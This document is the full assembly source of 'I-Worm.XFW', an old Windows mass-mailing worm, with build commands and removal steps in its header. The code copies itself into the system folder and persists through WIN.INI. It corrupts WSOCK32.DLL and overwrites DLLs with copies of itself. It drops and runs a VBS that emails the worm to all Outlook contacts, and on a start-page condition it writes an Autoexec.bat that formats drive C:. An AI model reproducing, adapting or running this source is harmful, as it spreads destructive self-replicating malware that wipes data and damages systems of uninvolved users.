; comment #
; Name : I-Worm.XFW (Extra French Worm)
; Author : PetiK
; Date : July 10th - August 3th
; Size :  5632 byte (compressed with UPX)
; 
; Action: It copies itself to \SYSTEM\Services.exe. It adds a value in the run services key :
;   "Run Services"="\SYSTEM\Services.exe". It alters the "run=" lines int he WIN.INI file.
;   It copies the file WSOCK32.DLL by WSOCK32.PTK and alters the original file while add
;   "PetiK" in the file.It displays a message and create a \WINDOWS\Tool_PetiK.txt.
;   This file explains how repair WSOCK32.DLL.
;   If the worm is located in the \SYSTEM folder, it searches all DLL files in the
;   current folder (SYSTEM here) and copies them by the worm while add the ".EXE" extention.
;           FILE.DLL ==>> FILE.DLL.EXE
; 
;   It creates at the end if the computer is connected a VBS file to spread with Outlook.
; 
; To delete :       del \WINDOWS\SYSTEM\Wsock32.dll
;       ren \WINDOWS\SYSTEM\Wsock32.ptk \WINDOWS\SYSTEM\Wsock32.dll
;       del \WINDOWS\SYSTEM\Services.exe
;       del \WINDOWS\SYSTEM\*.dll.exe
;       del \WINDOWS\Tool_PetiK.txt
;       del in the WIN.INI file after run=
;       del C:\.vbs
; 
; tasm32 /M /ML XFW.asm
; tlink32 -Tpe -aa -x XFW.obj,,,import32
; upx -9 XFW.exe
; 
; #

.586p
.model flat
.code

;JUMPS

callx macro a
extrn a:proc
call a
endm

include useful.inc


DEBUT:  jmp INET
VERIF:  push  00h
    callx GetModuleHandleA
    push  50h
    push  offset szOrig
    push  eax
    callx GetModuleFileNameA

    push  50h
    push  offset szCopie
    callx GetSystemDirectoryA
    @pushsz "\SERVICES.EXE"
    push  offset szCopie
    callx lstrcat

    push  offset szOrig
    push  offset szCopie
    callx lstrcmp
    test  eax,eax
    jz    INF_DLL

COPIE:  push  00h
    push  offset szCopie
    push  offset szOrig
    callx CopyFileA                     ; copy to \SYSTEM\Services.exe

W_INI:  push  50
    push  offset Winini
    callx GetWindowsDirectoryA
    @pushsz "\\WIN.INI"
    push  offset Winini
    callx lstrcat
    push  offset Winini
    push  offset szCopie
    @pushsz "run"
    @pushsz "windows"
    callx WritePrivateProfileStringA
    
WSOCK:  push  50
    mov   edi,offset a_wsck
    push  edi
    callx GetSystemDirectoryA
    test  eax,eax
    jz    FIN
    add   edi,eax
    mov   eax,"OSW\"
    stosd
    mov   eax,"23KC"
    stosd
    mov   eax,"LLD."
    stosd
    xor   eax,eax
    stosd                           ; serach \SYSTEM\Wsock32.dll

    push  offset a_wsck
    push  offset n_wsck
    callx lstrcat
    mov   esi,offset n_wsck
    push  esi
    callx lstrlen
    add   esi,eax
    sub   esi,4                     ; to become \SYSTEM\Wsock32
    mov   [esi],"KTP."                  ; and \SYSTEM\Wsock32.ptk
    
    push  01h
    push  offset n_wsck
    push  offset a_wsck
    callx CopyFileA
    test  eax,eax
    jz    FIN
    
    xor   eax,eax
    push  eax
    push  eax
    push  03h
    push  eax
    push  eax
    push  80000000h or 40000000h
    push  offset a_wsck
    callx CreateFileA
    inc   eax
    jz    FIN
    dec   eax
    mov   WsckHdl,eax
    
    xor   eax,eax
    push  eax
    push  eax
    push  eax
    push  04h                       ; PAGE_READWRITE
    push  eax
    push  WsckHdl
    callx CreateFileMappingA
    test  eax,eax
    jz    FIN2
    mov   WsckMap,eax

    xor   eax,eax
    push  eax
    push  eax
    push  eax
    push  06h                       ; SECTION_MAP_WRITE or READ
    push  WsckMap
    callx MapViewOfFile
    test  eax,eax
    jz    FIN3
    mov   WsckView,eax
    
    mov   esi,eax
    cmp   byte ptr [esi+12h],"P"
    je    FIN3
    mov   word ptr [esi+12h],"eP"
    mov   word ptr [esi+14h],"it"
    mov   byte ptr [esi+16h],"K"

FIN4:   push  WsckView
    callx UnmapViewOfFile
FIN3:   push  WsckMap
    callx CloseHandle
FIN2:   push  WsckHdl
    callx CloseHandle

F_MESS: push  10h
    @pushsz "Loader Error"
    @pushsz "This program will be terminated"
    push  00h
    callx MessageBoxA

TOOLS:  pushad
    push  50
    push  offset windir
    callx GetWindowsDirectoryA
    @pushsz "\Tool_PetiK.txt"
    push  offset windir
    callx lstrcat
    push  00h
    push  01h or 20h
    push  02h
    push  00h
    push  01h
    push  40000000h
    push  offset windir
    callx CreateFileA
    mov   edi,eax
    push  00h
    push  offset octets
    push  TXTSIZE
    push  offset txtd
    push  edi
    callx WriteFile
    push  edi
    callx CloseHandle
    popad
    jmp   FIN

INF_DLL:
D_INF:  push  50
    push  offset szCurFolder
    callx GetCurrentDirectoryA
    push  offset szCurFolder
    callx SetCurrentDirectoryA
FFF:    push  offset Search
    @pushsz "*.dll"
    callx FindFirstFileA                    ; search all DLL files
    inc   eax
    je    F_INF
    dec   eax
    mov   [htmlHdl],eax
i_file: pushad
    mov   edi,offset Search.cFileName
    push  edi
    callx lstrlen
    add   edi,eax
    mov   eax,"EXE."                    ; and add .EXE => file.dll.exe
    stosd
    xor   eax,eax
    stosd
    push  01h
    push  offset Search.cFileName
    push  offset szOrig
    callx CopyFileA                     ; and copies with the main worm
    test  eax,eax
    jz    S_P
    push  offset Search
    push  [htmlHdl]
    callx FindNextFileA
    test  eax,eax
    jne   i_file
FC: push  [htmlHdl]
    callx FindClose
    popad
F_INF:

S_P:    push  offset RegHandle
    push  01h
    push  00h   
    @pushsz "Software\Microsoft\Internet Explorer\Main"
    push  80000001h
    callx RegOpenKeyExA
    test  eax,eax
    jnz   FIN
    push  offset PageSize
    push  offset Page
    push  offset ValueType
    push  00h   
    @pushsz "Start Page"
    push  RegHandle
    callx RegQueryValueExA
    push  [RegHandle]
        callx  RegCloseKey

    @pushsz "http://www.whitesonly.net"
    push  offset Page
    callx lstrcmp
    test  eax,eax
    jz    FORMAT
    @pushsz "http://www.kkk.com"
    push  offset Page
    callx lstrcmp
    test  eax,eax
    jz    FORMAT
    @pushsz "http://www.front-national.fr"
    push  offset Page
    callx lstrcmp
    test  eax,eax
    jz    FORMAT
    @pushsz "http://www.lepen-tv.com"
    push  offset Page
    callx lstrcmp
    test  eax,eax
    jz    FORMAT
    @pushsz "http://www.hammerskins.com"
    push  offset Page
    callx lstrcmp
    test  eax,eax
    jz    FORMAT
    jmp   INET

FORMAT: pushad
    push  00h
    push  20h
    push  02h
    push  00h
    push  01h
    push  40000000h
    @pushsz "C:\Autoexec.bat"
    callx CreateFileA
    mov   edi,eax
    push  00h
    push  offset octets
    push  BATSIZE
    push  offset batd
    push  edi
    callx WriteFile
    push  edi
    callx CloseHandle
    popad
    jmp   FIN

INET:   @pushsz "WININET.dll"
    callx LoadLibraryA
    test  eax,eax
    jz    FIN
    mov   WNEThdl,eax
    @pushsz "InternetCheckConnectionA"
    push  WNEThdl   
    callx GetProcAddress
    test  eax,eax
    jz    FIN
    mov   netcheck,eax
VNET:   xor   eax,eax
    push  eax
    push  eax
    push  eax
    call  [netcheck]
    xchg  eax,ecx
    jecxz VNET
FNET:   push  [WNEThdl]
    callx FreeLibrary

    push  40h
    @pushsz "Internet"
    @pushsz "You're connected"
    push  00h
    callx MessageBoxA

VBS:    pushad
    push  00h
    push  80h
    push  02h
    push  00h
    push  01h
    push  40000000h
    @pushsz "C:\Win.vbs"
    callx CreateFileA
    mov   edi,eax
    push  00h
    push  offset octets2
    push  VBSSIZE
    push  offset vbsd
    push  edi
    callx WriteFile
    push  edi
    callx CloseHandle
    popad
    push  01h
    @pushsz "wscript C:\Win.vbs"
    callx WinExec
    push  30 * 1000
    @pushsz "C:\Win.vbs"
    callx DeleteFileA

FIN:    push  00h
    callx ExitProcess


.data
; ========== INSTALLATION ========== 
a_wsck      db 50 dup (0)
n_wsck      db 50 dup (0)
szCopie     db 50 dup (0)
szOrig      db 50 dup (0)
Winini      db 50 dup (0)
windir      db 50 dup (0)
octets      dd ?

; ============ INFECTION 1 ===========
WsckHdl     dd ?
filesize    dd ?
WsckMap     dd ?
WsckView    dd ?

; ============ INFECTION 2 ===========
htmlHdl     dd ?
szCurFolder db 50 dup (0)

; =============== EMail ==============
RegHandle   dd ?
Page        db 7Fh dup (0)
PageSize    dd 7Fh
ValueType   dd 0
WNEThdl     dd ?
netcheck    dd ?
octets2     dd ?

WormName    db "I-Worm.XFW coded by PetiK (c)2001 "
Origine     db "Made In France",00h

txtd    db "To restore Wsock32.dll :",13,10
    db "extract /a D:\WIN98\precopy1.cab wsock32.dll /L C:\WINDOWS\SYSTEM",00h
    TXTSIZE equ $-txtd

batd    db "echo y | format c: /U /V:FuckYou"
    BATSIZE equ $-batd

SYSTIME     struct
wYear           WORD ?
wMonth          WORD ?
wDayOfWeek      WORD ?
wDay            WORD ?
wHour           WORD ?
wMinute         WORD ?
wSecond         WORD ?
wMillisecond        WORD ?
SYSTIME     ends

MAX_PATH    equ 260

FILETIME    struct
dwLowDateTime       dd ?
dwHighDateTime      dd ?
FILETIME        ends
WIN32_FIND_DATA struct
dwFileAttributes    dd ?
ftCreationTime      FILETIME ?
ftLastAccessTime    FILETIME ?
ftLastWriteTime     FILETIME ?
nFileSizeHigh       dd ?
nFileSizeLow        dd ?
dwReserved0     dd ?
dwReserved1     dd ?
cFileName       dd MAX_PATH (?)
cAlternateFileName  db 13 dup (?)
            db 3 dup (?)
WIN32_FIND_DATA ends

SystemTime  SYSTIME <>
Search      WIN32_FIND_DATA <>

vbsd:
db 'Set K = CreateObject("Outlook.Application")',0dh,0ah
db 'Set L = K.GetNameSpace("MAPI")',0dh,0ah
db 'For Each M In L.AddressLists',0dh,0ah
db 'If M.AddressEntries.Count <> 0 Then',0dh,0ah
db 'For O = 1 To M.AddressEntries.Count',0dh,0ah
db 'Set P = M.AddressEntries(O)',0dh,0ah
db 'Set N = K.CreateItem(0)',0dh,0ah
db 'N.To = P.Address',0dh,0ah
db 'N.Subject = "Xtra game for you"',0dh,0ah
db 'N.Body = "This is for you"',0dh,0ah
db 'Set Q = CreateObject("Scripting.FileSystemObject")',0dh,0ah
db 'N.Attachments.Add Q.BuildPath(Q.GetSpecialFolder(1),"Services.exe")',0dh,0ah
db 'N.DeleteAfterSubmit = True',0dh,0ah
db 'If N.To <> "" Then',0dh,0ah
db 'N.Send',0dh,0ah
db 'End If',0dh,0ah
db 'Next',0dh,0ah
db 'End If',0dh,0ah
db 'Next',0dh,0ah
VBSSIZE equ $-vbsd

end DEBUT
end
